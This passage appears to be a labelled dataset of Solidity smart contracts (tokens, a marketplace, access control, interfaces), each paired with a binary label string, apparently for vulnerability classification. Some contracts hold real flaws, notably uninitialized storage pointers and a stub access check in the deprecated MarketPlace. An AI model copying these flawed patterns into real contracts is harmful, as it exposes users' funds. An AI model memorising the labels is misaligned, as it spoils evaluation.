10078,1_Deprecated_MarketPlace,"pragma solidity ^0.4.18;





import ""./MarketPlaceInterface.sol"";





contract IERC20 {

  function balanceOf(address who) public constant returns (uint256);

  function transfer(address to, uint256 value) public returns (bool);

  function allowance(address owner, address spender) public constant returns (uint256);

  function transferFrom(address from, address to, uint256 value) public returns (bool);

  function approve(address spender, uint256 value) public returns (bool);

  function getTest() public view returns (address);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);

}

 
 
 
 
 
 
 




contract MarketPlace is MarketPlaceInterface

{

	 



	 

	struct DataSource{

		bytes32 name;

		uint monthlyPrice;

		address owner;

		bool isData;

	}

	 

	struct DataProvider{

		address owner;

		bool isProvider;

		DataSource[] sourcesList;

		mapping(bytes32=>DataSource) sourcesMap;

	}

	 

	struct SubscribedDataSource{

		DataSource dataSource;

		uint startTime;

		uint endTime;

	}

	 

	struct Subscriber{

		address subscriber;

		bool isSubscriber;

		SubscribedDataSource[] sourcesList;

		mapping(bytes32=>SubscribedDataSource) sourcesMap;

	}

	 

	

	 
	IERC20 public mToken;

	 
	uint public mFixedSubscriptionPeriod;

	 
	mapping(address => DataProvider) mDataProviders;

	 
	mapping(address => Subscriber) mSubscribers;

	 
	mapping(bytes32 => address) mNameMap;



	 

	bytes32 testBytes;

	bool testChanged ;



	function MarketPlace(address _tokenAddress, uint _fixedSubscriptionPeriod) public 

	{

		testChanged = false;

		mFixedSubscriptionPeriod = _fixedSubscriptionPeriod;

		mToken = IERC20(_tokenAddress);

	}



	function subscribe(bytes32 _dataSourceName) 

	public 

	dataSourceNameExist(_dataSourceName) 

	returns (bool)

	{



		string memory testData = ""Enterd function subscribe"";

		TestLog(msg.sender,msg.sender, testData);

		 
		address providerAddress = mNameMap[_dataSourceName];

		require(!isNewProvider(providerAddress));

		DataSource ds = mDataProviders[providerAddress].sourcesMap[_dataSourceName];

		require(ds.isData);

		SubscribedDataSource storage sds;

		require(safeTransfer(msg.sender,providerAddress,ds.monthlyPrice));

		

		 
		sds.dataSource = ds;

		sds.startTime = now; 

		sds.endTime = now + mFixedSubscriptionPeriod;



		if(isNewSubscriber(msg.sender))

		{

			Subscriber subscriber;

			subscriber.subscriber = msg.sender;

			subscriber.isSubscriber = true;

			subscriber.sourcesList.push(sds);

			subscriber.sourcesMap[_dataSourceName] = sds;		

			mSubscribers[msg.sender] = subscriber;

		}

		else

		{

			mSubscribers[msg.sender].sourcesList.push(sds);

			mSubscribers[msg.sender].sourcesMap[_dataSourceName] = sds;

		}

		Subscribed(msg.sender,_dataSourceName, providerAddress, ds.monthlyPrice, true);

		return true;

	}

	function register(bytes32 _dataSourceName, uint _price, address _dataOwner) 

	public 

	validPrice(_price)

	uniqueDataSourceName(_dataSourceName) 

	returns (bool)

	{

				 
		testBytes = _dataSourceName;

		testChanged = true;

		require(_dataOwner != address(0));



		 
		mNameMap[_dataSourceName] = _dataOwner;	

		DataSource storage ds;

		ds.name = _dataSourceName;

		ds.monthlyPrice = _price;

		ds.owner = _dataOwner;

		ds.isData = true;



		if(isNewProvider(_dataOwner))  
		{

			 
			DataProvider storage dp;

			dp.owner = _dataOwner;

			dp.isProvider = true;

			dp.sourcesList.push(ds);

			dp.sourcesMap[_dataSourceName] = ds;

			mDataProviders[_dataOwner] = dp;

		}

		else  
		{

			mDataProviders[_dataOwner].sourcesList.push(ds);

			mDataProviders[_dataOwner].sourcesMap[_dataSourceName] = ds;

		}

		Registered(_dataOwner, _dataSourceName, _price, true);

		return true;

	}



	function checkAddressSubscription(address _subscriber, bytes32 _dataSourceName) public returns (bool)

	{

		require(_subscriber != address(0));

		return true;

	}



	function getOwnerFromName(bytes32 _dataSourceName) public view returns(address)

	{

		return mNameMap[_dataSourceName];

	}

	function getDataSource(bytes32 _dataSourceName) public view returns(address,bytes32,bool)

	{

		address owner = mNameMap[_dataSourceName];

		return (owner,testBytes,testChanged);

	}

	 

	function isNewProvider(address _testProvider) internal view returns (bool)

	{

		if(mDataProviders[_testProvider].isProvider)

			return false;

		else

			return true;

	}

	function isNewSubscriber(address _testSubscriber) internal view returns (bool)

	{

		if(mSubscribers[_testSubscriber].isSubscriber)

			return false;

		else

			return true;

	}

	function safeTransfer(address _from, address _to, uint256 _amount) internal returns (bool){

		require(address(_from) != 0 && address(_to)!=0);

		require(mToken.allowance(_from,address(this)) >= _amount);

		require(mToken.transferFrom(_from,_to,_amount));

		SubscriptionPaid(_from, _to, _amount);

		return true;

	}

	 

	modifier uniqueDataSourceName(bytes32 _testName)

	{

		require(mNameMap[_testName]==0);

		_;

	}

	modifier validPrice(uint _testPrice)

	{

		require(_testPrice>=0);

		_;

	}

	modifier dataSourceNameExist(bytes32 _testName)

	{

		require(mNameMap[_testName] != 0);

		_;

	}

	 

	function getTest() public view returns (address){

		return mToken.getTest();

	}

	function balanceOf(address who) public constant returns (uint256){

		return mToken.balanceOf(who);

	}

	function transfer(address to, uint256 value) public returns (bool){

		return mToken.transfer(to,value);

	}



}",0000000000000000000010000
10079,1_Deprecated_Marketplace_interface,"pragma solidity ^0.4.18;



contract MarketPlaceInterface 

{

	function subscribe(bytes32 _dataSourceName) public returns (bool);

	function register(bytes32 _dataSourceName, uint _price, address _dataOwner) public returns (bool);

	function checkAddressSubscription(address _subscriber, bytes32 _dataSourceName) public view returns (address,bytes32,uint,uint,uint);

	

	event Subscribed(address indexed subscriber,bytes32 indexed dataSourceName, address indexed dataOwner, uint price, bool success);

	event Registered(address indexed dataOwner, bytes32 indexed dataSourceName, uint price, bool success);

	event SubscriptionPaid(address indexed from, address indexed to, uint256 value);

	event PriceUpdate(address indexed editor, bytes32 indexed dataSourceName, uint256 newPrice);

	event ActivityUpdate(address indexed editor, bytes32 indexed dataSourceName, bool newStatus);

	 

	event TestLog(address addr1,address addr2, string data);

}",0000000000000000000000000
10080,A,"pragma solidity ^0.5.8;



contract A {

  uint256 a;



  constructor(uint256 _a) public {

    a = _a;

  }

}",0000000000000000000000000
10081,AB,"pragma solidity ^0.5.8;



contract AB {

  uint256 a;

  int256 b;



  uint256 fund;



  constructor(uint256 _a, int256 _b) public {

    a = _a;

    b = _b;

  }



  function burnFund() public payable {

    fund += msg.value;

  }



  function getBurnedFund() public view returns(uint256) {

    return fund;

  }



  function setA(uint256 _a) public {

    a = _a;

  }



  function setB(int256 _b) public {

    b = _b;

  }



  function setAB(uint256 _a, int256 _b) public {

    a = _a;

    b = _b;

  }



  function getA() public view returns(uint256) {

    return a;

  }



  function getB() public view returns(int256) {

    return b;

  }



  function getAB() public view returns(uint256, int256) {

    return (a, b);

  }

}",0000000000010000000100000
10082,AbiGenDummy," 



pragma experimental ABIEncoderV2;



pragma solidity ^0.5.5;





contract AbiGenDummy

{



    uint256 constant internal SOME_CONSTANT = 1234;

    string constant internal REVERT_REASON = ""REVERT_WITH_CONSTANT"";

    string constant internal REQUIRE_REASON = ""REQUIRE_WITH_CONSTANT"";



    function simplePureFunction ()

        public

        pure

        returns (uint256 result)

    {

        return 1;

    }



    function simplePureFunctionWithInput (uint256 x)

        public

        pure

        returns (uint256 sum)

    {

        return 1 + x;

    }



    function pureFunctionWithConstant ()

        public

        pure

        returns (uint256 someConstant)

    {

        return SOME_CONSTANT;

    }



    function simpleRevert ()

        public

        pure

    {

        revert(""SIMPLE_REVERT"");

    }



    function revertWithConstant ()

        public

        pure

    {

        revert(REVERT_REASON);

    }



    function simpleRequire ()

        public

        pure

    {

        require(0 > 1, ""SIMPLE_REQUIRE"");

    }



    function requireWithConstant ()

        public

        pure

    {

        require(0 > 1, REQUIRE_REASON);

    }



     
     
     
     
     
     
     
    function ecrecoverFn(bytes32 hash, uint8 v, bytes32 r, bytes32 s)

        public

        pure

        returns (address signerAddress)

    {

        bytes memory prefix = ""\x19Ethereum Signed Message:\n32"";

        bytes32 prefixedHash = keccak256(abi.encodePacked(prefix, hash));

        return ecrecover(prefixedHash, v, r, s);

    }



     
     
    function withAddressInput(address x, uint256 a, uint256 b, address y, uint256 c)

        public

        pure

        returns (address z)

    {

        return x;

    }



    function acceptsBytes(bytes memory a) public pure {}



     
     
    function acceptsAnArrayOfBytes(bytes[] memory a) public pure {}



    struct Struct {

        bytes someBytes;

        uint32 anInteger;

        bytes[] aDynamicArrayOfBytes;

        string aString;

    }



    function structInput(Struct memory s) public pure {}



     
     
    function structOutput() public pure returns(Struct memory s) {

        bytes[] memory byteArray = new bytes[](2);

        byteArray[0] = ""0x123"";

        byteArray[1] = ""0x321"";



        return Struct({

            someBytes: ""0x123"",

            anInteger: 5,

            aDynamicArrayOfBytes: byteArray,

            aString: ""abc""

        });

    }



    function methodReturningArrayOfStructs() public pure returns(Struct[] memory) {}



    struct NestedStruct {

        Struct innerStruct;

        string description;

    }



    function nestedStructInput(NestedStruct memory n) public pure {}

    function nestedStructOutput() public pure returns(NestedStruct memory) {}



    struct StructNotDirectlyUsedAnywhere {

        uint256 aField;

    }



    struct NestedStructWithInnerStructNotUsedElsewhere {

        StructNotDirectlyUsedAnywhere innerStruct;

    }



    function methodUsingNestedStructWithInnerStructNotUsedElsewhere()

        public pure returns(NestedStructWithInnerStructNotUsedElsewhere  memory)

    {}



    uint someState;

    function nonPureMethod() public returns(uint) { return someState += 1; }

    function nonPureMethodThatReturnsNothing() public { someState += 1; }



    function methodReturningMultipleValues()

        public pure returns (uint256, string memory)

    {

        return (1, ""hello"");

    }



    function overloadedMethod(int a) public pure {}

    function overloadedMethod(string memory a) public pure {}





    event Withdrawal(address indexed _owner, uint _value);



    function withdraw(uint wad) public {

        emit Withdrawal(msg.sender, wad);

    }



    event SimpleEvent(bytes someBytes, string someString);



    function emitSimpleEvent() public {

        emit SimpleEvent(

            hex'12345678',

            ""lorem""

        );

    }



     
     
    struct ComplexInput {

        uint256 foo;

        bytes bar;

        string car;

    }



     
    struct ComplexOutput {

        ComplexInput input;

        bytes lorem;

        bytes ipsum;

        string dolor;

    }



     
    function noInputNoOutput()

        public

        pure

    {

         
        require(true == true);

    }



     
    function noInputSimpleOutput()

        public

        pure

        returns (uint256)

    {

        return 1991;

    }



     
    function simpleInputNoOutput(uint256)

        public

        pure

    {

         
        require(true == true);

    }



     
    function simpleInputSimpleOutput(uint256)

        public

        pure

        returns (uint256)

    {

        return 1991;

    }



     
    function complexInputComplexOutput(ComplexInput memory complexInput)

        public

        pure

        returns (ComplexOutput memory)

    {

        return ComplexOutput({

            input: complexInput,

            lorem: hex'12345678',

            ipsum: hex'87654321',

            dolor: ""amet""

        });

    }



     
    function multiInputMultiOutput(

        uint256,

        bytes memory,

        string memory

    )

        public

        pure

        returns (

            bytes memory,

            bytes memory,

            string memory

        )

    {

        return (

            hex'12345678',

            hex'87654321',

            ""amet""

        );

    }



     
}

",0000000000000000000100000
10083,ABL,"pragma solidity ^0.4.19;





contract OwnableToken {

    mapping (address => bool) owners;



    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    event OwnershipExtended(address indexed host, address indexed guest);



    modifier onlyOwner() {

        require(owners[msg.sender]);

        _;

    }



    constructor() public {

        owners[msg.sender] = true;

    }



    function addOwner(address guest) public onlyOwner {

        require(guest != address(0));

        owners[guest] = true;

        emit OwnershipExtended(msg.sender, guest);

    }



    function transferOwnership(address newOwner) public onlyOwner {

        require(newOwner != address(0));

        owners[newOwner] = true;

        delete owners[msg.sender];

        emit OwnershipTransferred(msg.sender, newOwner);

    }

}





 

library SafeMath {



     

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {

            return 0;

        }

        uint256 c = a * b;

        assert(c / a == b);

        return c;

    }



     

    function div(uint256 a, uint256 b) internal pure returns (uint256) {

         
        uint256 c = a / b;

         
        return c;

    }



     

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        assert(b <= a);

        return a - b;

    }



     

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;

        assert(c >= a);

        return c;

    }

}





 

contract ERC20Basic {

    function totalSupply() public view returns (uint256);

    function balanceOf(address who) public view returns (uint256);

    function transfer(address to, uint256 value) public returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

}





 

contract BasicToken is ERC20Basic {

    using SafeMath for uint256;



    mapping(address => uint256) balances;



    uint256 totalSupply_;



     

    function totalSupply() public view returns (uint256) {

        return totalSupply_;

    }



     

    function transfer(address _to, uint256 _value) public returns (bool) {

        require(_to != address(0));

        require(_value <= balances[msg.sender]);



         
        balances[msg.sender] = balances[msg.sender].sub(_value);

        balances[_to] = balances[_to].add(_value);

        emit Transfer(msg.sender, _to, _value);

        return true;

    }



     

    function balanceOf(address _owner) public view returns (uint256 balance) {

        return balances[_owner];

    }



}





 

contract ERC20 is ERC20Basic {

    function allowance(address owner, address spender) public view returns (uint256);

    function transferFrom(address from, address to, uint256 value) public returns (bool);

    function approve(address spender, uint256 value) public returns (bool);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}





 

contract StandardToken is ERC20, BasicToken {

    mapping (address => mapping (address => uint256)) internal allowed;





     

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {

        require(_to != address(0));

        require(_value <= balances[_from]);

        require(_value <= allowed[_from][msg.sender]);



        balances[_from] = balances[_from].sub(_value);

        balances[_to] = balances[_to].add(_value);

        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);

        emit Transfer(_from, _to, _value);

        return true;

    }



     

    function approve(address _spender, uint256 _value) public returns (bool) {

        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }



     

    function allowance(address _owner, address _spender) public view returns (uint256) {

        return allowed[_owner][_spender];

    }



     

    function increaseApproval(address _spender, uint _addedValue) public returns (bool) {

        allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);

        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);

        return true;

    }



     

    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {

        uint oldValue = allowed[msg.sender][_spender];

        if (_subtractedValue > oldValue) {

            allowed[msg.sender][_spender] = 0;

        } else {

            allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);

        }

        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);

        return true;

    }

}





contract ABL is StandardToken, OwnableToken {

    using SafeMath for uint256;



     
    uint256 public constant SUM = 400000000;    
    uint256 public constant DISTRIBUTION = 221450000;  
    uint256 public constant DEVELOPERS = 178550000;    


     
    string public constant name = ""Airbloc"";

    string public constant symbol = ""ABL"";

    uint256 public constant decimals = 18;

    uint256 public totalSupply = SUM.mul(10 ** uint256(decimals));



     
     
    bool isTransferable = false;



    constructor(

        address _dtb,

        address _dev

    ) public {

        require(_dtb != address(0));

        require(_dev != address(0));

        require(DISTRIBUTION + DEVELOPERS == SUM);



        balances[_dtb] = DISTRIBUTION.mul(10 ** uint256(decimals));

        emit Transfer(address(0), _dtb, balances[_dtb]);



        balances[_dev] = DEVELOPERS.mul(10 ** uint256(decimals));

        emit Transfer(address(0), _dev, balances[_dev]);

    }



    function unlock() external onlyOwner {

        isTransferable = true;

    }



    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {

        require(isTransferable || owners[msg.sender]);

        return super.transferFrom(_from, _to, _value);

    }



    function transfer(address _to, uint256 _value) public returns (bool) {

        require(isTransferable || owners[msg.sender]);

        return super.transfer(_to, _value);

    }



     
     
     
    function mint(

        address _to,

        uint256 _amount

    ) onlyOwner public returns (bool) {

        require(_to != address(0));

        require(_amount >= 0);



        totalSupply = totalSupply.add(_amount);

        balances[_to] = balances[_to].add(_amount);



        emit Mint(_to, _amount);

        emit Transfer(address(0), _to, _amount);



        return true;

    }



    function burn(

        uint256 _amount

    ) onlyOwner public {

        require(_amount >= 0);

        require(_amount <= balances[msg.sender]);



        totalSupply = totalSupply.sub(_amount);

        balances[msg.sender] = balances[msg.sender].sub(_amount);



        emit Burn(msg.sender, _amount);

        emit Transfer(msg.sender, address(0), _amount);

    }



    event Mint(address indexed _to, uint256 _amount);

    event Burn(address indexed _from, uint256 _amount);

}

",0000000000000000000000000
10084,AbstractDAO," 
contract DAO {

    function calcBaseFee(address sender, uint tokenCount) returns (uint fee);

    function calcBaseFeeForShares(address sender, uint shareCount) returns (uint fee);

}

",0000000000000000000000000
10085,AbstractDAOAuction," 
contract DAOAuction {

    function tokenLaunched() returns (bool launched);

}

",0000000000000000000000000
10086,AbstractERC20,"pragma solidity >=0.6.0;



import ""./IERC20.sol"";



library AbstractERC20 {



    function abstractReceive(IERC20 token, uint256 amount) internal returns(uint256) {

        if (token == IERC20(0)) {

            require(msg.value == amount);

            return amount;

        } else {

            uint256 balance = abstractBalanceOf(token, address(this));

            token.transferFrom(msg.sender, address(this), amount);

            uint256 cmp_amount = abstractBalanceOf(token, address(this)) - balance;

            require(cmp_amount != 0);

            return cmp_amount;

        }

    }



    function abstractTransfer(IERC20 token, address to, uint256 amount) internal returns(uint256) {

        if (token == IERC20(0)) {

            payable(to).transfer(amount);

            return amount;

        } else {

            uint256 balance = abstractBalanceOf(token, address(this));

            token.transfer(to, amount);

            uint256 cmp_amount = balance - abstractBalanceOf(token, address(this));

            require(cmp_amount != 0);

            return cmp_amount;

        }

    }



    function abstractBalanceOf(IERC20 token, address who) internal view returns (uint256) {

        if (token == IERC20(0)) {

            return who.balance;

        } else {

            return token.balanceOf(who);

        }

    }

}",0000000000000000000000000
10087,AbstractEventFactory," 
contract EventFactory {

    function createEvent(bytes32 descriptionHash, bool isRanged, int lowerBound, int upperBound, uint8 outcomeCount, address oracleAddress, address tokenAddress, bytes32[] data) returns (bytes32 eventHash);

    function buyAllOutcomes(bytes32 eventHash, uint shareCount);

    function sellAllOutcomes(bytes32 eventHash, uint shareCount);

    function redeemWinnings(bytes32 eventHash) returns (uint winnings);

    function changeDAO(address _shareholderContractAddress);

    function permitPermanentApproval(address spender);

    function revokePermanentApproval(address spender);



    function calcBaseFee(uint tokenCount) constant returns (uint fee);

    function calcBaseFeeForShares(uint shareCount) constant returns (uint fee);

    function isPermanentlyApproved(address owner, address spender) constant returns (bool isApproved);

    function getDAO() constant returns (address daoAddress);

    function getEventHashes(bytes32[] descriptionHashes) constant returns (uint[] allEventHashes);

    function getEvents(bytes32[] eventHashes, address oracleAddress) constant returns (uint[] allEvents);

    function getEvent(bytes32 eventHash) constant returns (bytes32 descriptionHash, bool isRanged, int lowerBound, int upperBound, uint outcomeCount, address token, address oracle, bytes32 oracleEventIdentifier, bool isWinningOutcomeSet, int winningOutcome);

    function getOutcomeToken(bytes32 eventHash, uint outcomeIndex) constant returns (address eventToken);

    function getShares(address user, bytes32[] _eventHashes) constant returns (uint[] allShares);



    event EventCreation(address indexed creator, bytes32 indexed eventHash);

}

",0000000000000000000010000
10088,AbstractFallbackOracle," 
contract FallbackOracle {

    function isValidSigner(bytes32 descriptionHash, address signer) returns (bool isValid);

    function isOutcomeSet(bytes32 descriptionHash) returns (bool isSet);

    function getOutcome(bytes32 descriptionHash) returns (int outcome);

}

",0000000000000000000000000
10089,AbstractMarketFactory," 
contract MarketFactory {

    function createMarket(bytes32 eventHash, uint fee, uint initialFunding, address marketMakerAddress) returns (bytes32 marketHash);

    function closeMarket(bytes32 marketHash);

    function withdrawFees(bytes32 marketHash) returns (uint fees);

    function buyShares(bytes32 marketHash, uint8 outcomeIndex, uint shareCount, uint maxSpending) returns (uint totalCosts);

    function sellShares(bytes32 marketHash, uint8 outcomeIndex, uint shareCount, uint expectedEarnings) returns (uint netEarnings);

    function shortSellShares(bytes32 marketHash, uint8 outcomeIndex, uint shareCount, uint expectedEarnings) returns (uint totalCosts);



    function calcMarketFee(bytes32 marketHash, uint tokenCount) constant returns (uint fee);

    function getMarketHashes(bytes32[] eventHashes, address[] investors) constant returns (uint[] allMarketHashes);

    function getMarkets(bytes32[] marketHashes, address investor) constant returns (uint[] allMarkets);

    function getMarket(bytes32 marketHash) constant returns (bytes32 eventHash, uint fee, uint collectedFees, uint initialFunding, address investor, address marketMaker, uint createdAtBlock);

    function getShareDistributionWithTimestamp(bytes32 marketHash) constant returns (uint[] shareDistribution);

    function getShareDistribution(bytes32 marketHash) constant returns (uint[256] shareDistribution);

    function getMinFunding() constant returns (uint minFunding);



     
     
    function name() constant returns (string) {}



    event MarketCreation(address indexed investor, bytes32 indexed marketHash);

    event MarketClosing(address indexed investor, bytes32 indexed marketHash);

}

",0000000000000000000010000
10090,AbstractMarketMaker," 
contract MarketMaker {

    function calcCostsBuying(bytes32 marketHash, uint initialFunding, uint[] shareDistribution, uint8 outcomeIndex, uint shareCount) constant returns (uint costs);

    function calcEarningsSelling(bytes32 marketHash, uint initialFunding, uint[] shareDistribution, uint8 outcomeIndex, uint shareCount) constant returns (uint earnings);



     
     
    function name() constant returns (string) {}

}

",0000000000000000000010000
10091,AbstractOracle," 
contract Oracle {

    function registerEvent(bytes32[] data) returns (bytes32 eventIdentifier);

     


    function isOutcomeSet(bytes32 eventIdentifier) constant returns (bool isSet);

    function getFee(bytes32[] data) constant returns (uint fee, address token);

    function getOutcome(bytes32 eventIdentifier) constant returns (int outcome);

    function getEventData(bytes32 eventIdentifier) constant returns (bytes32[] data);



     
     
    function name() constant returns (string) {}



    event EventRegistration(address indexed creator, bytes32 indexed eventIdentifier);

}

",0000000000000000000010000
10092,AbstractToken,"pragma solidity 0.4.21;



 
 
 
 
 




 
contract AbstractToken {

	function balanceOf(address owner) public view returns (uint256 balance);

	function transfer(address to, uint256 value) public returns (bool success);

	function transferFrom(address from, address to, uint256 value) public returns (bool success);

	function approve(address spender, uint256 value) public returns (bool success);

	function allowance(address owner, address spender) public view returns (uint256 remaining);



	event Transfer(address indexed from, address indexed to, uint256 value);

	event Approval(address indexed owner, address indexed spender, uint256 value);

}

",0000000000000000000000000
10093,AcceptingRecipient," 



pragma solidity 0.4.24;



import ""openzeppelin-solidity/contracts/ownership/CanReclaimToken.sol"";

import ""./IERC677Recipient.sol"";



 

contract AcceptingRecipient is CanReclaimToken, IERC677Recipient {



    address public from;

    uint256 public amount;

    bytes public data;



    function onTokenTransfer(address from_, uint256 amount_, bytes data_) external returns (bool) {

        from = from_;

        amount = amount_;

        data = data_;

        return true;

    }



}



",0000000000000000000000000
10094,AccessControl,"pragma solidity ^0.6.0;



import ""../utils/EnumerableSet.sol"";

import ""../utils/Address.sol"";

import ""../GSN/Context.sol"";



 

abstract contract AccessControl is Context {

    using EnumerableSet for EnumerableSet.AddressSet;

    using Address for address;



    struct RoleData {

        EnumerableSet.AddressSet members;

        bytes32 adminRole;

    }



    mapping (bytes32 => RoleData) private _roles;



    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;



     

    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);



     

    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);



     

    function hasRole(bytes32 role, address account) public view returns (bool) {

        return _roles[role].members.contains(account);

    }



     

    function getRoleMemberCount(bytes32 role) public view returns (uint256) {

        return _roles[role].members.length();

    }



     

    function getRoleMember(bytes32 role, uint256 index) public view returns (address) {

        return _roles[role].members.at(index);

    }



     

    function getRoleAdmin(bytes32 role) public view returns (bytes32) {

        return _roles[role].adminRole;

    }



     

    function grantRole(bytes32 role, address account) public virtual {

        require(hasRole(_roles[role].adminRole, _msgSender()), ""AccessControl: sender must be an admin to grant"");



        _grantRole(role, account);

    }



     

    function revokeRole(bytes32 role, address account) public virtual {

        require(hasRole(_roles[role].adminRole, _msgSender()), ""AccessControl: sender must be an admin to revoke"");



        _revokeRole(role, account);

    }



     

    function renounceRole(bytes32 role, address account) public virtual {

        require(account == _msgSender(), ""AccessControl: can only renounce roles for self"");



        _revokeRole(role, account);

    }



     

    function _setupRole(bytes32 role, address account) internal virtual {

        require(!address(this).isContract(), ""AccessControl: roles cannot be setup after construction"");

        _grantRole(role, account);

    }



     

    function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {

        _roles[role].adminRole = adminRole;

    }



    function _grantRole(bytes32 role, address account) private {

        if (_roles[role].members.add(account)) {

            emit RoleGranted(role, account, _msgSender());

        }

    }



    function _revokeRole(bytes32 role, address account) private {

        if (_roles[role].members.remove(account)) {

            emit RoleRevoked(role, account, _msgSender());

        }

    }

}

",0000000100000000000000000
10095,AccessControlled,"pragma solidity ^0.4.18;



import ""../interfaces/IIdentity.sol"";

import ""../interfaces/IIdentityManager.sol"";



contract AccessControlled {



    modifier onlyId(address id) {

        require(IIdentityManager(IIdentity(id).getIdMgr()).isOwner(id, msg.sender));

        _;

    }

    

    modifier onlyIdOrAuthorized(address _id) {

        require (isIdOrAuthorized(_id));

        _;

    }



    modifier onlyIdDelegateOrAuthorized(address _id, address _deleagte) {

        require (isIdOrAuthorized(_id));

        if (_deleagte != address(0)){

            require (isIdOrAuthorized(_deleagte));

        }

        _;

    }



    function isIdOrAuthorized(address _id) internal view returns (bool) {

        IIdentityManager identityManager = IIdentityManager(IIdentity(_id).getIdMgr());

        return (identityManager.isOwnerOrAuthorized(_id, msg.sender));

    }



    function isIdOrAuthorizedWithAcct(address _id, address _acct) internal view returns (bool) {

        IIdentityManager identityManager = IIdentityManager(IIdentity(_id).getIdMgr());

        return (identityManager.isOwnerOrAuthorized(_id, _acct));

    }

}

",0000000000000000000000000
10096,AccessControlledBase," 



pragma solidity 0.4.24;

pragma experimental ""v0.5.0"";





 

contract AccessControlledBase {

     


    mapping (address => bool) public authorized;



     


    event AccessGranted(

        address who

    );



    event AccessRevoked(

        address who

    );



     


    modifier requiresAuthorization() {

        require(

            authorized[msg.sender],

            ""AccessControlledBase#requiresAuthorization: Sender not authorized""

        );

        _;

    }

}

",0000000000000000000000000
10097,AccessControlMock,"pragma solidity ^0.6.0;



import ""../access/AccessControl.sol"";



contract AccessControlMock is AccessControl {

    constructor() public {

        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());

    }



    function setRoleAdmin(bytes32 roleId, bytes32 adminRoleId) public {

        _setRoleAdmin(roleId, adminRoleId);

    }



    function setupRole(bytes32 roleId, address account) public {

        _setupRole(roleId, account);

    }

}

",0000000000000000000000000
10098,AccessManager,"pragma solidity ^0.4.17;





 
contract AccessManager {

     


     


    address public server;  
    address public populous;  


     


     

    function AccessManager(address _server) public {

        server = _server;

         
    }



     

    function changeServer(address _server) public {

        require(isServer(msg.sender) == true);

        server = _server;

    }



     

     



     

    function changePopulous(address _populous) public {

        require(isServer(msg.sender) == true);

        populous = _populous;

    }



     
    

     

    function isServer(address sender) public view returns (bool) {

        return sender == server;

    }



     

     



     

    function isPopulous(address sender) public view returns (bool) {

        return sender == populous;

    }



}",0000000000000000000000000
10099,AccessRestriction," 
 


pragma solidity ^0.4.21;



contract AccessRestriction {



    address public owner = msg.sender;

    uint public lastOwnerChange = now;



    modifier onlyBy(address _account) {

        require(msg.sender == _account);

        _;

    }



    modifier onlyAfter(uint _time) {

        require(now >= _time);

        _;

    }



    modifier costs(uint _amount) {

        require(msg.value >= _amount);

        _;

        if (msg.value > _amount) {

            msg.sender.transfer(msg.value - _amount);

        }

    }



    function changeOwner(address _newOwner) public onlyBy(owner) {

        owner = _newOwner;

    }



    function buyContract() public payable onlyAfter(lastOwnerChange + 4 weeks) costs(1 ether) {

        owner = msg.sender;

        lastOwnerChange = now;

    }

}

",0000000000010000000000000
10100,AccessRoles,"pragma solidity 0.4.26;





 
 
contract AccessRoles {



     
     
     


     
     
     


     
    bytes32 internal constant ROLE_NEUMARK_ISSUER = 0x921c3afa1f1fff707a785f953a1e197bd28c9c50e300424e015953cbf120c06c;



     
    bytes32 internal constant ROLE_NEUMARK_BURNER = 0x19ce331285f41739cd3362a3ec176edffe014311c0f8075834fdd19d6718e69f;



     
    bytes32 internal constant ROLE_SNAPSHOT_CREATOR = 0x08c1785afc57f933523bc52583a72ce9e19b2241354e04dd86f41f887e3d8174;



     
    bytes32 internal constant ROLE_TRANSFER_ADMIN = 0xb6527e944caca3d151b1f94e49ac5e223142694860743e66164720e034ec9b19;



     
    bytes32 internal constant ROLE_RECLAIMER = 0x0542bbd0c672578966dcc525b30aa16723bb042675554ac5b0362f86b6e97dc5;



     
    bytes32 internal constant ROLE_PLATFORM_OPERATOR_REPRESENTATIVE = 0xb2b321377653f655206f71514ff9f150d0822d062a5abcf220d549e1da7999f0;



     
    bytes32 internal constant ROLE_WHITELIST_ADMIN = 0xaef456e7c864418e1d2a40d996ca4febf3a7e317fe3af5a7ea4dda59033bbe5c;



     
    bytes32 internal constant ROLE_EURT_DEPOSIT_MANAGER = 0x7c8ecdcba80ce87848d16ad77ef57cc196c208fc95c5638e4a48c681a34d4fe7;



     
    bytes32 internal constant ROLE_IDENTITY_MANAGER = 0x32964e6bc50f2aaab2094a1d311be8bda920fc4fb32b2fb054917bdb153a9e9e;



     
    bytes32 internal constant ROLE_EURT_LEGAL_MANAGER = 0x4eb6b5806954a48eb5659c9e3982d5e75bfb2913f55199877d877f157bcc5a9b;



     
    bytes32 internal constant ROLE_UNIVERSE_MANAGER = 0xe8d8f8f9ea4b19a5a4368dbdace17ad71a69aadeb6250e54c7b4c7b446301738;



     
    bytes32 internal constant ROLE_GAS_EXCHANGE = 0x9fe43636e0675246c99e96d7abf9f858f518b9442c35166d87f0934abef8a969;



     
    bytes32 internal constant ROLE_TOKEN_RATE_ORACLE = 0xa80c3a0c8a5324136e4c806a778583a2a980f378bdd382921b8d28dcfe965585;



     
    bytes32 internal constant ROLE_DISBURSER = 0xd7ea6093d11d866c9e8449f8bffd9da1387c530ee40ad54f0641425bb0ca33b7;



     
    bytes32 internal constant ROLE_DISBURSAL_MANAGER = 0x677f87f7b7ef7c97e42a7e6c85c295cf020c9f11eea1e49f6bf847d7aeae1475;



     
